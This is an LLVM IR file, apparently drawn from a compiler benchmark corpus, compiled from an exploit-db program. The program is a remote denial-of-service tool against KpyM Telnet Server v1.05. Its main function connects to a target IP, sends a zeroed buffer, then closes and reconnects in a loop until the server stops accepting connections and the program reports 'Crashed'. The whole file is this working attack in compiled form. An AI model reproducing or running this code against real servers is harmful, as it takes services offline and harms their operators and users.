; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23530.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_23530.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@PORT = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [119 x i8] c"\0AKpyM Telnet Server v1.05 remote DoS\0Aby NoRpiUs\0Ae-mail: norpius@altervista.org\0Aweb:    http://norpius.altervista.org\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"\0AUso: %s <ip>\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@BUFFSZ = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"[-] Can't allocate buffer\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [25 x i8] c"[-] Can't create socket\0A\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"\0A[+] Connecting to %s:%hu...\0A\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"[-] Can't connect\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"[-] No response from the server\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"[+] Waiting for the crash.. \00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"[-] Can't send\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"\0A[+] Crashed\0A\0D\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @PORT, align 4
  store i32 %11, i32* %10, align 4
  %12 = load i32, i32* @stdout, align 4
  %13 = call i32 @setbuf(i32 %12, i32* null)
  %14 = load i32, i32* @stdout, align 4
  %15 = call i32 @fputs(i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str, i64 0, i64 0), i32 %14)
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @resolv(i8* %27)
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 0
  store i32 %28, i32* %30, align 4
  %31 = load i32, i32* %10, align 4
  %32 = call i32 @htons(i32 %31)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %32, i32* %33, align 4
  %34 = load i32, i32* @AF_INET, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %34, i32* %35, align 4
  %36 = load i32, i32* @BUFFSZ, align 4
  %37 = call i32* @malloc(i32 %36)
  store i32* %37, i32** %6, align 8
  %38 = load i32*, i32** %6, align 8
  %39 = icmp ne i32* %38, null
  br i1 %39, label %44, label %40

40:                                               ; preds = %24
  %41 = load i32, i32* @stdout, align 4
  %42 = call i32 @fputs(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i32 %41)
  %43 = call i32 @exit(i32 0) #3
  unreachable

44:                                               ; preds = %24
  %45 = load i32, i32* @AF_INET, align 4
  %46 = load i32, i32* @SOCK_STREAM, align 4
  %47 = load i32, i32* @IPPROTO_TCP, align 4
  %48 = call i32 @socket(i32 %45, i32 %46, i32 %47)
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %55

51:                                               ; preds = %44
  %52 = load i32, i32* @stdout, align 4
  %53 = call i32 @fputs(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i32 %52)
  %54 = call i32 @exit(i32 0) #3
  unreachable

55:                                               ; preds = %44
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %57 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = call i8* @inet_ntoa(i32 %58)
  %60 = load i32, i32* %10, align 4
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0), i8* %59, i32 %60)
  %62 = load i32, i32* %8, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %62, %struct.sockaddr* %63, i32 12)
  store i32 %64, i32* %9, align 4
  %65 = load i32, i32* %9, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %71

67:                                               ; preds = %55
  %68 = load i32, i32* @stdout, align 4
  %69 = call i32 @fputs(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i32 %68)
  %70 = call i32 @exit(i32 0) #3
  unreachable

71:                                               ; preds = %55
  %72 = load i32, i32* %8, align 4
  %73 = load i32*, i32** %6, align 8
  %74 = load i32, i32* @BUFFSZ, align 4
  %75 = call i32 @recv(i32 %72, i32* %73, i32 %74, i32 0)
  store i32 %75, i32* %9, align 4
  %76 = load i32, i32* %9, align 4
  %77 = icmp slt i32 %76, 0
  br i1 %77, label %78, label %82

78:                                               ; preds = %71
  %79 = load i32, i32* @stdout, align 4
  %80 = call i32 @fputs(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i32 %79)
  %81 = call i32 @exit(i32 0) #3
  unreachable

82:                                               ; preds = %71
  %83 = load i32*, i32** %6, align 8
  %84 = load i32, i32* @BUFFSZ, align 4
  %85 = call i32 @memset(i32* %83, i32 0, i32 %84)
  %86 = load i32, i32* @stdout, align 4
  %87 = call i32 @fputs(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i32 %86)
  br label %88

88:                                               ; preds = %82, %116
  %89 = load i32, i32* %8, align 4
  %90 = load i32*, i32** %6, align 8
  %91 = load i32, i32* @BUFFSZ, align 4
  %92 = call i32 @send(i32 %89, i32* %90, i32 %91, i32 0)
  store i32 %92, i32* %9, align 4
  %93 = load i32, i32* %9, align 4
  %94 = icmp slt i32 %93, 0
  br i1 %94, label %95, label %99

95:                                               ; preds = %88
  %96 = load i32, i32* @stdout, align 4
  %97 = call i32 @fputs(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0), i32 %96)
  %98 = call i32 @exit(i32 0) #3
  unreachable

99:                                               ; preds = %88
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0))
  %101 = load i32, i32* %8, align 4
  %102 = call i32 @close(i32 %101)
  %103 = load i32, i32* @AF_INET, align 4
  %104 = load i32, i32* @SOCK_STREAM, align 4
  %105 = load i32, i32* @IPPROTO_TCP, align 4
  %106 = call i32 @socket(i32 %103, i32 %104, i32 %105)
  store i32 %106, i32* %8, align 4
  %107 = load i32, i32* %8, align 4
  %108 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %109 = call i32 @connect(i32 %107, %struct.sockaddr* %108, i32 12)
  store i32 %109, i32* %9, align 4
  %110 = load i32, i32* %9, align 4
  %111 = icmp slt i32 %110, 0
  br i1 %111, label %112, label %116

112:                                              ; preds = %99
  %113 = load i32, i32* @stdout, align 4
  %114 = call i32 @fputs(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0), i32 %113)
  %115 = call i32 @exit(i32 0) #3
  unreachable

116:                                              ; preds = %99
  br label %88
}

declare dso_local i32 @setbuf(i32, i32*) #1

declare dso_local i32 @fputs(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @resolv(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32* @malloc(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @recv(i32, i32*, i32, i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @send(i32, i32*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
